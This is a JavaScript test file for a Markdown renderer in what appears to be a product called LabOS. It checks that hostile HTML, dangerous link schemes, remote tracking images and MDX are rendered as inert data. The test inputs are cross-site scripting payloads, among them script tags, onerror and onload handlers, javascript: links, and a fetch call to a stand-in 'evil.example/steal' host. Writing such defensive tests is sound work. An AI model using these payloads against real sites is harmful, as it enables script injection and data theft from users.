/**
 * LabOS Workspace — hostile content and Markdown rendering tests.
 *
 * Run with: node --test labos/scripts/markdown-security.test.mjs
 *
 * The QA checklist requires that hostile HTML, `javascript:` links, remote
 * tracking images and MDX-looking source may not execute code, leak a local file,
 * silently fetch third-party assets or trigger an agent action.
 *
 * These tests are written from the attacker's side: each one asserts that a
 * specific attack produces inert data rather than a live capability. Rendering
 * emits a data structure and never an HTML string, so "no execution" is
 * structural rather than a matter of escaping well enough.
 */

import assert from 'node:assert/strict';
import { promises as fs } from 'node:fs';
import { createRequire } from 'node:module';
import path from 'node:path';
import { test } from 'node:test';

const require = createRequire(import.meta.url);
const repoRoot = path.resolve(
  path.dirname(new URL(import.meta.url).pathname),
  '..',
  '..'
);

async function loadMarkdown() {
  const ts = require(
    path.join(repoRoot, 'node_modules', 'typescript', 'lib', 'typescript.js')
  );
  const sourcePath = path.join(
    repoRoot,
    'packages/frontend/core/src/modules/labos-repo/markdown.ts'
  );
  const source = await fs.readFile(sourcePath, 'utf8');
  const transpiled = ts.transpileModule(source, {
    compilerOptions: {
      module: ts.ModuleKind.ESNext,
      target: ts.ScriptTarget.ES2022,
    },
    fileName: sourcePath,
  }).outputText;
  const dataUrl =
    'data:text/javascript;base64,' +
    Buffer.from(transpiled, 'utf8').toString('base64');
  return import(dataUrl);
}

const md = await loadMarkdown();

/** Flatten every string a rendered document would put on screen. */
function allText(document) {
  const parts = [];
  const pushInline = inline => {
    if ('value' in inline) parts.push(inline.value);
  };
  for (const block of document.blocks) {
    if ('content' in block) block.content.forEach(pushInline);
    if (block.kind === 'code') parts.push(block.value);
    if (block.kind === 'list') block.items.forEach(i => i.forEach(pushInline));
    if (block.kind === 'task') block.items.forEach(i => i.content.forEach(pushInline));
    if (block.kind === 'table') {
      block.header.forEach(pushInline);
      block.rows.forEach(row => row.forEach(cell => cell.forEach(pushInline)));
    }    if (block.kind === 'raw-html' || block.kind === 'unsupported') {
      parts.push(block.value);
    }
  }
  return parts.join('\n');
}

// --- HTML must never become live markup --------------------------------------

test('a script tag is shown as text and never as executable markup', () => {
  const document = md.renderMarkdown('<script>alert(1)</script>');
  const text = allText(document);

  assert.ok(text.includes('script'), 'the text is still visible to the reader');
  // The angle brackets are replaced, so the string cannot be interpreted as
  // markup even if a future caller inserted it as HTML.
  assert.ok(!text.includes('<script>'), 'a live script tag must not survive');
  for (const block of document.blocks) {
    assert.notEqual(block.kind, 'html');
  }
});

test('an img onerror payload cannot execute', () => {
  const document = md.renderMarkdown(
    '<img src=x onerror="fetch(\'https://evil.example/steal\')">'
  );
  const text = allText(document);
  assert.ok(!text.includes('<img'), 'the tag must not survive as markup');
  assert.ok(text.includes('onerror'), 'the reader can still see what was written');
});

test('dropped tags are reported rather than silently disappearing', () => {
  for (const html of [
    '<iframe src="https://evil.example"></iframe>',
    '<object data="x"></object>',
    '<embed src="x">',
    '<form action="https://evil.example"><input name="a"></form>',
    '<base href="https://evil.example/">',
    '<style>body{display:none}</style>',
  ]) {
    const document = md.renderMarkdown(html);
    const reported = document.blocks.find(
      block => block.kind === 'unsupported' && block.syntax.startsWith('html:')
    );
    assert.ok(reported, `a dropped tag must be reported for: ${html}`);
  }
});

test('inline HTML inside a paragraph cannot introduce markup', () => {
  const document = md.renderMarkdown(
    'Normal text with <b onclick="alert(1)">bold attempt</b> in it'
  );
  const text = allText(document);
  assert.ok(!text.includes('<b'), 'the raw tag must not survive');
  assert.ok(text.includes('bold attempt'), 'the content is still readable');
});

test('an image tag embedded mid-sentence cannot introduce markup', () => {
  // Regression guard: raw-HTML handling originally ran only when a line STARTED
  // with a tag, so `<img onerror>` inside a sentence passed through untouched.
  // That is the more likely attack, because it hides in ordinary prose.
  const document = md.renderMarkdown(
    'Here is a picture <img src=x onerror="alert(1)"> in the middle.'
  );
  const text = allText(document);
  assert.ok(!text.includes('<img'), 'the tag must not survive mid-sentence');
  assert.ok(
    !/<[a-zA-Z]/.test(text.replace(/\u2039\u203a/g, '')),
    'no live tag may appear anywhere in the rendered text'
  );
  assert.ok(text.includes('Here is a picture'), 'surrounding prose is intact');
  assert.ok(text.includes('in the middle'), 'trailing prose is intact');
});

test('no rendered text can ever contain a live tag', () => {
  // A broad sweep over shapes an attacker would try.
  const hostile = [
    'text <script>alert(1)</script> more',
    'text <svg/onload=alert(1)> more',
    'text <a href="javascript:alert(1)">x</a> more',
    'text <iframe src="//evil.example"> more',
    'text <img src="//tracking.example/p"> more',
    'text <!-- comment --> more',
    '<div><span><b>nested</b></span></div>',
    'text <style>*{}</style> more',
  ];
  for (const source of hostile) {
    const document = md.renderMarkdown(source);
    const text = allText(document);
    assert.ok(
      !/<(script|svg|iframe|img|a|div|span|b|style|object|embed|form|base)\b/i.test(text),
      `a live tag survived rendering: ${source}`
    );
  }
});

// --- link schemes -------------------------------------------------------------

test('javascript: links are defused and the reason is recorded', () => {
  const result = md.sanitizeLinkTarget('javascript:alert(1)');
  assert.equal(result.href, null, 'no navigable target may be produced');
  assert.match(result.blocked ?? '', /javascript/);
});

test('other dangerous schemes are defused', () => {
  for (const target of [
    'javascript:alert(1)',
    'JavaScript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    'chrome://settings',
  ]) {
    const result = md.sanitizeLinkTarget(target);
    assert.equal(result.href, null, `must be inert: ${target}`);
    assert.ok(result.blocked, `the reason must be recorded: ${target}`);
  }
});

test('http, https, mailto and relative links survive', () => {
  assert.equal(
    md.sanitizeLinkTarget('https://example.com/a').href,
    'https://example.com/a'
  );
  assert.equal(
    md.sanitizeLinkTarget('http://example.com/a').href,
    'http://example.com/a'
  );
  assert.ok(md.sanitizeLinkTarget('mailto:a@b.example').href?.startsWith('mailto:'));
  assert.equal(md.sanitizeLinkTarget('./relative/path.md').href, './relative/path.md');
  assert.equal(md.sanitizeLinkTarget('#anchor').href, '#anchor');
});

test('a defused link keeps its label so content is not lost', () => {
  const document = md.renderMarkdown('[click me](javascript:alert(1))');
  const paragraph = document.blocks.find(block => block.kind === 'paragraph');
  const link = paragraph.content.find(inline => inline.kind === 'link');
  assert.ok(link, 'the link node is preserved');
  assert.equal(link.value, 'click me', 'the label is readable');
  assert.equal(link.href, null, 'but it is not navigable');
  assert.ok(link.blocked, 'and the reader can be told why');
});

// --- remote images ------------------------------------------------------------

test('a remote image is not fetched and is reported instead', () => {
  const document = md.renderMarkdown(
    '![tracker](https://tracking.example/pixel.gif?user=abc)'
  );
  const paragraph = document.blocks.find(block => block.kind === 'paragraph');
  const image = paragraph.content.find(inline => inline.kind === 'unsupported');
  assert.ok(image, 'the image is represented as unsupported, not as an image');
  assert.equal(image.syntax, 'remote-image');
  // The URL is visible so the reader knows what the file referenced, but no
  // fetch is implied by the data structure.
  assert.match(image.value, /tracking\.example/);
});

test('protocol-relative and http image sources are also treated as remote', () => {
  assert.equal(md.isRemoteImageSource('//evil.example/x.png'), true);
  assert.equal(md.isRemoteImageSource('http://evil.example/x.png'), true);
  assert.equal(md.isRemoteImageSource('https://evil.example/x.png'), true);
  assert.equal(md.isRemoteImageSource('./local.png'), false);
});

test('a local image is reported distinctly from a remote one', () => {
  const document = md.renderMarkdown('![diagram](./assets/diagram.png)');
  const paragraph = document.blocks.find(block => block.kind === 'paragraph');
  const image = paragraph.content.find(inline => inline.kind === 'unsupported');
  assert.equal(image.syntax, 'local-image');
});

// --- MDX ----------------------------------------------------------------------

test('MDX expressions and components are shown verbatim, never executed', () => {
  const source = [
    'export const meta = { title: "x" }',
    '',
    '{{ dangerousExpression }}',
    '',
    '<MyComponent prop={1} />',
  ].join('\n');

  const document = md.renderMarkdown(source);
  const text = allText(document);
  assert.ok(text.includes('dangerousExpression'), 'the source stays visible');
  const unsupported = document.blocks.filter(b => b.kind === 'unsupported');
  assert.ok(
    unsupported.some(b => b.syntax === 'mdx'),
    'MDX syntax must be flagged rather than rendered'
  );
  // Nothing in the output is a component reference.
  for (const block of document.blocks) {
    assert.notEqual(block.kind, 'component');
  }
});

// --- content preservation ------------------------------------------------------

test('frontmatter is preserved verbatim and not rendered as prose', () => {
  const source = [
    '---',
    'title: Real Title',
    'tags: [a, b]',
    '---',
    '',
    '# Heading',
  ].join('\n');
  const document = md.renderMarkdown(source);
  assert.equal(
    document.frontmatter,
    ['---', 'title: Real Title', 'tags: [a, b]', '---'].join('\n')
  );
  const text = allText(document);
  assert.ok(!text.includes('tags: [a, b]'), 'frontmatter is not body prose');
  assert.ok(text.includes('Heading'));
});

test('a fenced code block containing backticks survives intact', () => {
  const source = ['````md', '```js', 'const x = 1;', '```', '````'].join('\n');
  const document = md.renderMarkdown(source);
  const code = document.blocks.find(block => block.kind === 'code');
  assert.ok(code);
  assert.equal(code.value, ['```js', 'const x = 1;', '```'].join('\n'));
  assert.equal(code.language, 'md');
});

test('inline code protects its contents from emphasis', () => {
  const document = md.renderMarkdown('Use `a *b* c` literally');
  const paragraph = document.blocks.find(block => block.kind === 'paragraph');
  const code = paragraph.content.find(inline => inline.kind === 'code');
  assert.equal(code.value, 'a *b* c', 'the asterisks survive verbatim');
});

test('a heading produces a table-of-contents entry with a stable anchor', () => {
  const document = md.renderMarkdown('# One\n\n## Two Words\n\n## Two Words\n');
  assert.equal(document.toc.length, 3);
  assert.equal(document.toc[0].id, 'one');
  assert.equal(document.toc[1].id, 'two-words');
  assert.equal(
    document.toc[2].id,
    'two-words-2',
    'duplicate headings must not collide'
  );
});

test('tables, tasks, quotes and rules render as structured blocks', () => {
  const source = [
    '| a | b |',
    '| - | - |',
    '| 1 | 2 |',
    '| 3 | 4 |',
    '',
    '- [ ] todo',
    '- [x] done',
    '',
    '> quoted text',
    '',
    '---',
  ].join('\n');
  const document = md.renderMarkdown(source);
  const kinds = document.blocks.map(b => b.kind);
  assert.ok(kinds.includes('table'));
  assert.ok(kinds.includes('task'));
  assert.ok(kinds.includes('quote'));
  assert.ok(kinds.includes('rule'));

  const tasks = document.blocks.find(b => b.kind === 'task');
  assert.equal(tasks.items.length, 2);
  assert.equal(tasks.items[0].checked, false);
  assert.equal(tasks.items[1].checked, true);
});

test('a table keeps its header and every body row, in order', () => {
  // Regression guard: a duplicated index increment made the parser read the
  // header from the wrong line and drop a body row, which produced a table that
  // looked plausible but was factually wrong.
  const source = [
    '| name | value |',
    '| ---- | ----- |',
    '| one  | 1     |',
    '| two  | 2     |',
    '| three| 3     |',
  ].join('\n');

  const document = md.renderMarkdown(source);
  const table = document.blocks.find(block => block.kind === 'table');
  assert.ok(table, 'a table block is produced');

  const cellText = cell => ('value' in cell ? cell.value : '');
  assert.deepEqual(
    table.header.map(cellText),
    ['name', 'value'],
    'the header comes from the first row, not the delimiter row'
  );
  assert.deepEqual(
    table.rows.map(row => row.map(cellText)),
    [
      ['one', '1'],
      ['two', '2'],
      ['three', '3'],
    ],
    'every body row is present, in order'
  );
});

test('UTF-8, emoji and unexpected syntax are preserved without loss', () => {
  const source = 'Café 日本語 🎯 and $$x^2$$ plus <not-a-real-tag';
  const document = md.renderMarkdown(source);
  const text = allText(document);
  assert.ok(text.includes('Café'));
  assert.ok(text.includes('日本語'));
  assert.ok(text.includes('🎯'));
  assert.ok(text.includes('$$x^2$$'), 'unknown syntax is kept as text');
});

test('rendering never returns an HTML string', () => {
  // The structural guarantee: output is a data structure, so there is no place
  // for an unescaped HTML payload to be inserted later.
  const document = md.renderMarkdown('# Title\n\ntext');
  assert.ok(Array.isArray(document.blocks));
  assert.equal(typeof document, 'object');
  assert.ok(!('html' in document));
  for (const block of document.blocks) {
    assert.equal(typeof block.kind, 'string');
  }
});

test('rendering is deterministic, so a no-op open produces no change', () => {
  const source = '# A\n\n- one\n- two\n\n```js\nx\n```\n';
  const first = md.renderMarkdown(source);
  const second = md.renderMarkdown(source);
  assert.deepEqual(first, second);
});

test('an empty document renders without error', () => {
  const document = md.renderMarkdown('');
  assert.deepEqual(document.blocks, []);
  assert.deepEqual(document.toc, []);
  assert.equal(document.frontmatter, null);
});

test('malformed Markdown does not throw or loop', () => {
  for (const source of [
    '[unclosed link(',
    '`unclosed code',
    '```',
    '**unclosed bold',
    '{',
    '>',
    '|',
    '- [ ]',
    '##### ',
    '\\',
  ]) {
    assert.doesNotThrow(() => md.renderMarkdown(source), `must not throw: ${source}`);
  }
});
